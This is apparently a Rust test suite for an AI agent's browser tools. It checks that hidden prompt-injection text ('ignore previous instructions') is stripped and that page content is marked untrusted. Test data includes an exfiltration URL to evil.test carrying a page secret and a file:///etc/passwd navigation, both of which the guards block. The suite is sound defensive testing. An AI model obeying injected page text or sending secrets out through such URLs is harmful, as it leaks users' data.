//! Browser tools against an in-process fake CDP endpoint replaying recorded messages
//! (no real browser). The last test drives a real local Chrome and is `#[ignore]`d.
#![allow(clippy::unwrap_used, clippy::expect_used)] // test code

use std::collections::VecDeque;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use genie_browser::host::ConfirmDecision;
use genie_browser::testing::{FakeBackend, FakeCdp, FrameLog, RecordingHost, Reply};
use genie_browser::{Browser, BrowserConfig, CdpClient, SitePolicy, tools};
use genie_protocol::api::browser::{
    BrowserInputParams, InputEvent, ScreencastAckParams, ScreencastStartParams, SitePermission,
    SiteState, StreamIdParams,
};
use genie_protocol::common::{Mode, SessionKind};
use genie_protocol::event::{BrowserAction, SessionEvent, ToolProgress};
use genie_tools::{
    EventSink, PermissionGate, PermissionRequest, Tool, ToolCtx, ToolEnv, ToolError, ToolOutput,
};
use serde_json::{Value, json};
use tokio_util::sync::CancellationToken;
use tokio_util::task::TaskTracker;

const SESSION: &str = "s1";

#[derive(Default)]
struct Gate {
    asked: Mutex<Vec<PermissionRequest>>,
    answers: Mutex<VecDeque<Result<(), ToolError>>>,
}

#[async_trait]
impl PermissionGate for Gate {
    async fn assert(&self, req: PermissionRequest) -> Result<(), ToolError> {
        self.asked.lock().unwrap().push(req);
        self.answers.lock().unwrap().pop_front().unwrap_or(Ok(()))
    }
}

#[derive(Default)]
struct Events(Mutex<Vec<SessionEvent>>);

impl EventSink for Events {
    fn publish(&self, e: SessionEvent) {
        self.0.lock().unwrap().push(e);
    }
    fn progress(&self, _p: ToolProgress) {}
}

impl Events {
    fn actions(&self) -> Vec<BrowserAction> {
        self.0
            .lock()
            .unwrap()
            .iter()
            .filter_map(|e| match e {
                SessionEvent::BrowserAction(a) => Some(a.clone()),
                _ => None,
            })
            .collect()
    }
}

struct Rig {
    fake: FakeCdp,
    browser: Arc<Browser>,
    host: Arc<RecordingHost>,
    gate: Arc<Gate>,
    events: Arc<Events>,
    tools: Vec<Arc<dyn Tool>>,
    mode: Mode,
    turn: String,
    _tasks: TaskTracker,
}

fn fixture() -> Vec<Value> {
    serde_json::from_str(include_str!("fixtures/checkout.json")).unwrap()
}

/// The recorded page load (everything but the post-click entries).
fn recording() -> Value {
    Value::Array(
        fixture()
            .into_iter()
            .filter(|e| e.get("after_click").is_none())
            .collect(),
    )
}

/// The page as recorded after "Place order" was clicked.
fn after_click(fake: &FakeCdp) {
    for e in fixture()
        .into_iter()
        .filter(|e| e.get("after_click").is_some())
    {
        let m = e["method"].as_str().unwrap();
        fake.reset(m);
        fake.ok(m, e["result"].clone());
    }
}

fn rig_with(cfg: BrowserConfig, timeout: Duration, host: RecordingHost) -> Rig {
    let tasks = TaskTracker::new();
    let (fake, wire) = FakeCdp::new(&tasks);
    fake.load(&recording());
    let client = CdpClient::connect_with_timeout(wire, &tasks, timeout);
    let host = Arc::new(host);
    let browser = Browser::new(
        Arc::new(FakeBackend::new(client)),
        host.clone(),
        Arc::new(SitePolicy::new()),
        cfg,
        tasks.clone(),
    );
    let tools = tools(&browser);
    Rig {
        fake,
        browser,
        host,
        gate: Arc::new(Gate::default()),
        events: Arc::new(Events::default()),
        tools,
        mode: Mode::Default,
        turn: "turn1".into(),
        _tasks: tasks,
    }
}

fn rig() -> Rig {
    rig_with(
        BrowserConfig::default(),
        Duration::from_secs(5),
        RecordingHost::default(),
    )
}

impl Rig {
    fn ctx(&self, tool: &str) -> ToolCtx {
        let mut env = ToolEnv::new(SESSION, SessionKind::Chat);
        env.mode = self.mode;
        ToolCtx {
            env: Arc::new(env),
            turn_id: self.turn.clone(),
            call_id: format!("call-{tool}"),
            tool_name: tool.into(),
            cancel: CancellationToken::new(),
            detach: CancellationToken::new(),
            permissions: self.gate.clone(),
            events: self.events.clone(),
        }
    }

    async fn call(&self, tool: &str, input: Value) -> Result<String, ToolError> {
        let t = self
            .tools
            .iter()
            .find(|t| t.name() == tool)
            .unwrap_or_else(|| panic!("no tool {tool}"));
        match t.execute(input, self.ctx(tool)).await? {
            ToolOutput::Text(s) => Ok(s),
            ToolOutput::Json(v) => Ok(v.to_string()),
        }
    }

    fn allow_site(&self, site: &str) {
        self.browser.sites.set(&SitePermission {
            origin: site.into(),
            state: SiteState::Act,
        });
    }
}

async fn eventually(mut f: impl FnMut() -> bool) {
    for _ in 0..100 {
        if f() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("condition not reached");
}

#[tokio::test]
async fn tool_set() {
    let r = rig();
    let names: Vec<&str> = r.tools.iter().map(|t| t.name()).collect();
    assert_eq!(names.len(), 18);
    for n in [
        "browser_open",
        "browser_navigate",
        "browser_snapshot",
        "browser_read",
        "browser_find",
        "browser_screenshot",
        "browser_click",
        "browser_type",
        "browser_fill_form",
        "browser_select",
        "browser_press_key",
        "browser_hover",
        "browser_scroll",
        "browser_wait",
        "browser_tabs",
        "browser_upload",
        "browser_downloads",
        "browser_handoff",
    ] {
        assert!(names.contains(&n), "{n}");
    }
    let env = ToolEnv::new(SESSION, SessionKind::Chat);
    let shot = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_screenshot")
        .unwrap();
    assert!(!shot.availability(&env).is_available(), "vision-only");
    let click = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_click")
        .unwrap();
    assert_eq!(click.input_schema()["required"], json!(["ref"]));
}

#[tokio::test]
async fn navigate_snapshot_click_with_site_ask_confirmation_and_audit() {
    let r = rig();
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://shop.example/checkout"}),
        )
        .await
        .unwrap();
    assert!(
        out.starts_with("status: ok\ntab: t1\nurl: https://shop.example/checkout\n"),
        "{out}"
    );
    assert!(
        out.contains("<untrusted_web_content origin=\"https://shop.example\">"),
        "{out}"
    );
    assert!(out.contains("(new page)"));
    assert!(out.contains("- button \"Place order\" [ref=e4]"), "{out}");
    // Opacity-0 injection text never reaches the model.
    assert!(!out.contains("ignore previous instructions"));
    // First visit asked: "Allow for this chat · Always allow · Decline".
    {
        let asked = r.gate.asked.lock().unwrap();
        assert_eq!(asked.len(), 1);
        assert_eq!(asked[0].resource.as_deref(), Some("shop.example"));
        assert_eq!(
            asked[0].save_suggestions[0].rule,
            "Browser(site:shop.example)"
        );
    }
    let nav = r.fake.calls_to("Page.navigate");
    assert_eq!(nav[0].session_id.as_deref(), Some("S1"));

    // Reading again on the same site doesn't ask.
    let snap = r
        .call("browser_snapshot", json!({"mode": "full"}))
        .await
        .unwrap();
    assert!(
        snap.contains("text: Your promo code is SUMMER-SECRET-2026"),
        "{snap}"
    );
    assert!(snap.contains("(1 hidden items removed)"));
    assert_eq!(r.gate.asked.lock().unwrap().len(), 1);

    // `act` needs a second ask; the submit in a password form needs a D21 confirmation.
    after_click(&r.fake);
    let out = r.call("browser_click", json!({"ref": "e4"})).await.unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert!(out.contains("~ heading \"Order placed\""), "{out}");
    assert!(out.contains("[disabled]"), "{out}");
    assert_eq!(r.gate.asked.lock().unwrap().len(), 2);
    assert_eq!(r.host.confirm_actions(), vec!["submit"]);
    let confirm = r.host.confirms.lock().unwrap()[0].confirm.clone();
    assert_eq!(confirm.origin, "https://shop.example");
    assert!(confirm.summary.contains("Place order"));
    assert!(confirm.screenshot_blob.is_some());
    let mouse: Vec<String> = r
        .fake
        .calls_to("Input.dispatchMouseEvent")
        .iter()
        .map(|c| c.params["type"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(mouse, ["mouseMoved", "mousePressed", "mouseReleased"]);

    // Audit: one record per call, thumbnail after the act step.
    let a = r.events.actions();
    assert_eq!(a.len(), 3);
    assert_eq!(a[0].tool, "browser_navigate");
    assert_eq!(a[0].decision, "allowed:user");
    assert_eq!(a[0].status, "ok");
    assert_eq!(a[0].origin, "https://shop.example");
    assert!(a[0].thumbnail_ref.is_none());
    assert_eq!(a[2].tool, "browser_click");
    assert_eq!(a[2].decision, "confirmed:user");
    assert!(a[2].thumbnail_ref.is_some());
    // Taint (SA-29) reported for the turn.
    assert!(
        r.host
            .taints
            .lock()
            .unwrap()
            .iter()
            .all(|(t, o)| t == "turn1" && o == "https://shop.example")
    );
}

#[tokio::test]
async fn refusals_and_deterministic_gates() {
    let mut r = rig();
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    assert!(
        r.gate.asked.lock().unwrap().is_empty(),
        "site set to act: no ask"
    );

    // Typing into a password field is refused.
    let out = r
        .call("browser_type", json!({"ref": "e3", "text": "hunter2"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert!(out.contains("browser_handoff"));
    assert!(r.fake.calls_to("Input.insertText").is_empty());

    // Model-built URL carrying another origin's page text: exfiltration guard.
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://evil.test/collect?c=SUMMER-SECRET-2026"}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert!(out.contains("copied from https://shop.example"), "{out}");
    let long = "x".repeat(300);
    let out = r
        .call(
            "browser_navigate",
            json!({"url": format!("https://evil.test/?q={long}")}),
        )
        .await
        .unwrap();
    assert!(out.contains("query/fragment"), "{out}");
    // The same URL typed by the user is allowed through the guard (then asks for the site).
    r.host
        .user_urls
        .lock()
        .unwrap()
        .push("https://evil.test/collect?c=SUMMER-SECRET-2026".into());
    r.gate
        .answers
        .lock()
        .unwrap()
        .push_back(Err(ToolError::Declined { message: None }));
    let err = r
        .call(
            "browser_navigate",
            json!({"url": "https://evil.test/collect?c=SUMMER-SECRET-2026"}),
        )
        .await
        .unwrap_err();
    assert!(matches!(err, ToolError::Declined { .. }));

    // Category blocklist and non-web schemes.
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://console.anthropic.com/settings/keys"}),
        )
        .await
        .unwrap();
    assert!(out.contains("AI provider console"), "{out}");
    let out = r
        .call("browser_navigate", json!({"url": "file:///etc/passwd"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: blocked"));
    assert_eq!(r.fake.calls_to("Page.navigate").len(), 1);

    // Plan mode: navigate/read only.
    r.mode = Mode::Plan;
    let out = r.call("browser_click", json!({"ref": "e5"})).await.unwrap();
    assert!(out.contains("plan mode"), "{out}");

    // Commit verbs confirm; a denial blocks.
    r.mode = Mode::Bypass;
    r.host.decide(ConfirmDecision::Deny);
    let out = r.call("browser_click", json!({"ref": "e4"})).await.unwrap();
    assert!(out.contains("the user declined"), "{out}");
    let blocked: Vec<String> = r
        .events
        .actions()
        .iter()
        .map(|a| a.decision.clone())
        .collect();
    assert!(blocked.contains(&"blocked:exfiltration".to_string()));
    assert!(blocked.contains(&"blocked:category".to_string()));
    assert!(blocked.contains(&"blocked:mode".to_string()));
    assert!(blocked.contains(&"denied:user".to_string()));
}

#[tokio::test]
async fn takeover_handback_and_step_caps() {
    let cfg = BrowserConfig {
        max_steps: 2,
        ..BrowserConfig::default()
    };
    let r = rig_with(cfg, Duration::from_secs(5), RecordingHost::default());
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();

    r.browser.takeover(SESSION);
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"), "{out}");

    r.browser.handback(SESSION);
    let out = r.call("browser_hover", json!({"ref": "e2"})).await.unwrap();
    assert!(out.contains("note: the user acted in the browser"), "{out}");
    // A fresh outline rather than a diff.
    assert!(out.contains("(new page)"), "{out}");

    // Third step of the turn: check in with the user; "deny" stops browsing.
    r.host.decide(ConfirmDecision::Deny);
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: blocked"), "{out}");
    assert_eq!(r.host.confirm_actions(), vec!["continue"]);

    // Handoff from the agent.
    let mut r2 = r;
    r2.turn = "turn2".into();
    let out = r2
        .call("browser_handoff", json!({"reason": "log in"}))
        .await
        .unwrap();
    assert!(out.starts_with("status: user_in_control"));
    assert_eq!(r2.host.handoffs.lock().unwrap().as_slice(), ["log in"]);
    let out = r2.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"));
}

#[tokio::test]
async fn lost_result_is_unknown_and_not_retried() {
    let r = rig_with(
        BrowserConfig::default(),
        Duration::from_millis(300),
        RecordingHost::default(),
    );
    r.allow_site("shop.example");
    r.fake.reset("Page.navigate");
    r.fake.on("Page.navigate", Reply::dropped());
    let out = r
        .call(
            "browser_navigate",
            json!({"url": "https://shop.example/checkout"}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: unknown"), "{out}");
    assert!(out.contains("not retried"));
    assert_eq!(r.fake.calls_to("Page.navigate").len(), 1);
    assert_eq!(r.events.actions()[0].status, "unknown");
}

#[tokio::test]
async fn downloads_need_confirmation() {
    let dir = tempfile::tempdir().unwrap();
    let cfg = BrowserConfig {
        downloads_dir: Some(dir.path().to_path_buf()),
        ..BrowserConfig::default()
    };
    let r = rig_with(cfg, Duration::from_secs(5), RecordingHost::default());
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let set = r.fake.calls_to("Browser.setDownloadBehavior");
    assert_eq!(set[0].params["behavior"], "allowAndName");

    r.fake.on(
        "Input.dispatchMouseEvent",
        Reply::ok(json!({})).with_events(vec![json!({
            "method": "Browser.downloadWillBegin",
            "params": {"frameId": "T1", "guid": "g1", "url": "https://shop.example/invoice.pdf", "suggestedFilename": "invoice.pdf"}
        })]),
    );
    let out = r.call("browser_click", json!({"ref": "e5"})).await.unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert_eq!(r.host.confirm_actions(), vec!["download"]);
    assert_eq!(
        r.fake.calls_to("Browser.cancelDownload")[0].params["guid"],
        "g1"
    );
    let nav = r.fake.calls_to("Page.navigate");
    assert_eq!(
        nav.last().unwrap().params["url"],
        "https://shop.example/invoice.pdf"
    );
    let out = r.call("browser_downloads", json!({})).await.unwrap();
    assert!(out.contains("invoice.pdf (g1): canceled"), "{out}");
}

#[tokio::test]
async fn read_find_tabs_and_form_tools() {
    let r = rig();
    r.allow_site("shop.example");
    r.call(
        "browser_open",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let md = r.call("browser_read", json!({})).await.unwrap();
    assert!(md.contains("# Checkout"), "{md}");
    assert!(md.contains("[Help](https://shop.example/help)"));
    let f = r
        .call("browser_find", json!({"query": "promo"}))
        .await
        .unwrap();
    assert!(f.contains("SUMMER-SECRET"), "{f}");

    r.fake.ok(
        "Runtime.callFunctionOn",
        json!({"result": {"type": "undefined"}}),
    );
    let out = r
        .call(
            "browser_type",
            json!({"ref": "e2", "text": "a@b.c", "submit": true}),
        )
        .await
        .unwrap();
    assert!(out.starts_with("status: ok"), "{out}");
    assert_eq!(
        r.fake.calls_to("Input.insertText")[0].params["text"],
        "a@b.c"
    );
    // Enter in a form with a password field confirms first.
    assert_eq!(r.host.confirm_actions(), vec!["submit"]);
    let keys: Vec<String> = r
        .fake
        .calls_to("Input.dispatchKeyEvent")
        .iter()
        .map(|c| c.params["type"].as_str().unwrap().to_string())
        .collect();
    assert_eq!(keys, ["keyDown", "keyUp"]);

    let err = r
        .call(
            "browser_fill_form",
            json!({"fields": [{"ref": "e2", "value": "x"}, {"ref": "e3", "value": "pw"}]}),
        )
        .await
        .unwrap();
    assert!(err.starts_with("status: blocked"), "{err}");

    let out = r
        .call("browser_tabs", json!({"action": "list"}))
        .await
        .unwrap();
    assert!(
        out.contains("- t1 (active): Shop — https://shop.example/checkout"),
        "{out}"
    );
    let err = r
        .call("browser_tabs", json!({"action": "switch", "tab_id": "t9"}))
        .await
        .unwrap_err();
    assert!(matches!(err, ToolError::InvalidInput { .. }));
    let err = r
        .call("browser_click", json!({"ref": "e99"}))
        .await
        .unwrap_err();
    assert!(err.to_string().contains("unknown ref"));
}

#[tokio::test]
async fn screenshot_with_vision() {
    let host = RecordingHost {
        vision: true,
        ..RecordingHost::default()
    };
    let r = rig_with(BrowserConfig::default(), Duration::from_secs(5), host);
    r.allow_site("shop.example");
    r.call(
        "browser_navigate",
        json!({"url": "https://shop.example/checkout"}),
    )
    .await
    .unwrap();
    let env = ToolEnv::new(SESSION, SessionKind::Chat);
    let shot = r
        .tools
        .iter()
        .find(|t| t.name() == "browser_screenshot")
        .unwrap();
    assert!(shot.availability(&env).is_available());
    let out = r.call("browser_screenshot", json!({})).await.unwrap();
    assert!(out.contains("note: image: img1 (jpeg"), "{out}");
}

#[tokio::test]
async fn screencast_flow_control_and_input() {
    let r = rig();
    r.allow_site("shop.example");
    r.call("browser_open", json!({})).await.unwrap();
    let log = Arc::new(FrameLog::default());
    let sc = r
        .browser
        .screencast_start(
            &ScreencastStartParams {
                session_id: SESSION.into(),
                tab_id: None,
                max_width: 1280,
                max_height: 800,
                quality: 60,
            },
            log.clone(),
        )
        .await
        .unwrap();
    let start = r.fake.calls_to("Page.startScreencast");
    assert_eq!(start[0].session_id.as_deref(), Some("S1"));
    assert_eq!(start[0].params["quality"], 60);

    let frame = |n: i64| {
        json!({"method": "Page.screencastFrame", "sessionId": "S1", "params": {
            "data": "/9j/4AAQ", "sessionId": n,
            "metadata": {"deviceWidth": 1280, "deviceHeight": 800, "pageScaleFactor": 1, "offsetTop": 0, "scrollOffsetX": 0, "scrollOffsetY": 0, "timestamp": 1795000000.0}
        }})
    };
    let acks = |f: &FakeCdp| f.calls_to("Page.screencastFrameAck").len();
    r.fake.emit(frame(1));
    eventually(|| log.0.lock().unwrap().len() == 1).await;
    eventually(|| acks(&r.fake) == 1).await;
    // Client hasn't acked: frames 2 and 3 are held, Chrome isn't acked.
    r.fake.emit(frame(2));
    r.fake.emit(frame(3));
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert_eq!(log.0.lock().unwrap().len(), 1);
    assert_eq!(acks(&r.fake), 1);
    // The ack releases the newest frame and Chrome's ack.
    r.browser
        .screencast_ack(&ScreencastAckParams {
            stream_id: sc.stream_id.clone(),
            frame_seq: 1,
        })
        .unwrap();
    {
        let frames = log.0.lock().unwrap();
        assert_eq!(frames.len(), 2);
        assert_eq!(frames[1].frame_seq, 3);
        assert_eq!(frames[1].stream_id, sc.stream_id);
        assert_eq!(frames[1].tab_id, "t1");
        assert_eq!((frames[1].w, frames[1].h), (1280, 800));
        assert!(frames[1].ts.starts_with("2026-11-18T"));
    }
    eventually(|| acks(&r.fake) == 2).await;
    assert_eq!(
        r.fake.calls_to("Page.screencastFrameAck")[1].params["sessionId"],
        3
    );

    // Take-over input: forwarded, and the agent pauses.
    r.browser
        .input(&BrowserInputParams {
            session_id: SESSION.into(),
            tab_id: "t1".into(),
            event: InputEvent::InsertText { text: "hi".into() },
        })
        .await
        .unwrap();
    eventually(|| !r.fake.calls_to("Input.insertText").is_empty()).await;
    assert_eq!(
        r.fake.calls_to("Input.insertText")[0].session_id.as_deref(),
        Some("S1")
    );
    let out = r.call("browser_snapshot", json!({})).await.unwrap();
    assert!(out.starts_with("status: user_in_control"));

    r.browser
        .screencast_stop(&StreamIdParams {
            stream_id: sc.stream_id,
        })
        .await;
    assert_eq!(r.fake.calls_to("Page.stopScreencast").len(), 1);
}

/// Drives a real local Chrome/Edge/Chromium (`cargo test -p genie-browser -- --ignored`).
#[tokio::test]
#[ignore = "needs a local Chrome, Edge or Chromium"]
async fn real_chrome_smoke() {
    use genie_browser::{SystemChromeBackend, SystemChromeConfig};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};

    if genie_browser::discover::find_installed().await.is_empty() {
        eprintln!("no browser installed; skipping");
        return;
    }
    let tasks = TaskTracker::new();
    // A tiny local page.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    tasks.spawn(async move {
        while let Ok((mut s, _)) = listener.accept().await {
            let mut buf = [0u8; 2048];
            let _ = s.read(&mut buf).await;
            let body = "<html><head><title>Genie test</title></head><body><h1>Hello</h1>\
                <form><input aria-label='Name' id='n'><button type='button' onclick=\"document.querySelector('h1').textContent='Hi '+document.getElementById('n').value\">Greet</button></form>\
                <p style='opacity:0'>hidden injection</p></body></html>";
            let resp = format!(
                "HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = s.write_all(resp.as_bytes()).await;
        }
    });
    let dir = tempfile::tempdir().unwrap();
    let backend = Arc::new(SystemChromeBackend::new(
        SystemChromeConfig::new(dir.path()),
        tasks.clone(),
    ));
    let host = Arc::new(RecordingHost::default());
    let browser = Browser::new(
        backend.clone(),
        host,
        Arc::new(SitePolicy::new()),
        BrowserConfig::default(),
        tasks.clone(),
    );
    let ts = tools(&browser);
    let gate = Arc::new(Gate::default());
    let events = Arc::new(Events::default());
    let ctx = |tool: &str| ToolCtx {
        env: Arc::new(ToolEnv::new(SESSION, SessionKind::Chat)),
        turn_id: "t".into(),
        call_id: "c".into(),
        tool_name: tool.into(),
        cancel: CancellationToken::new(),
        detach: CancellationToken::new(),
        permissions: gate.clone(),
        events: events.clone(),
    };
    let call = |name: &'static str, input: Value| {
        let t = ts.iter().find(|t| t.name() == name).unwrap().clone();
        let c = ctx(name);
        async move { t.execute(input, c).await.unwrap().to_text() }
    };
    let out = call(
        "browser_navigate",
        json!({"url": format!("http://127.0.0.1:{port}/")}),
    )
    .await;
    println!("{out}");
    assert!(out.contains("status: ok"), "{out}");
    assert!(out.contains("heading \"Hello\""), "{out}");
    assert!(!out.contains("hidden injection"));
    let snap = call("browser_snapshot", json!({})).await;
    let r_name = snap
        .lines()
        .find(|l| l.contains("textbox \"Name\""))
        .and_then(|l| l.split("[ref=").nth(1))
        .and_then(|s| s.split(']').next())
        .unwrap()
        .to_string();
    let r_btn = snap
        .lines()
        .find(|l| l.contains("button \"Greet\""))
        .and_then(|l| l.split("[ref=").nth(1))
        .and_then(|s| s.split(']').next())
        .unwrap()
        .to_string();
    call("browser_type", json!({"ref": r_name, "text": "Genie"})).await;
    let out = call("browser_click", json!({"ref": r_btn})).await;
    println!("{out}");
    assert!(out.contains("Hi Genie"), "{out}");
    genie_browser::BrowserBackend::shutdown(backend.as_ref()).await;
}
